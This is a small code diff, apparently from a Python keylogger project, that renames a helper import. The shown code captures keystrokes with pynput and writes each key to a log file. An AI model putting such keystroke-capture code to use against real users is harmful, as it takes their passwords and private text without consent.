@@ -2,7 +2,7 @@ import shutil
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 from threading import Thread
-from FileHandler import FileHandler
+from Util import Util
 
 
 class Keylogger(Thread):
@@ -16,7 +16,7 @@ class Keylogger(Thread):
     def onPress(self, key):
         if self.__config.debug:
             print(key, end='')
-        FileHandler.fileOut(self.__config.logPath + self.__config.logFileName, key)
+        Util.fileOut(self.__config.logPath + self.__config.logFileName, key)
             
 
 
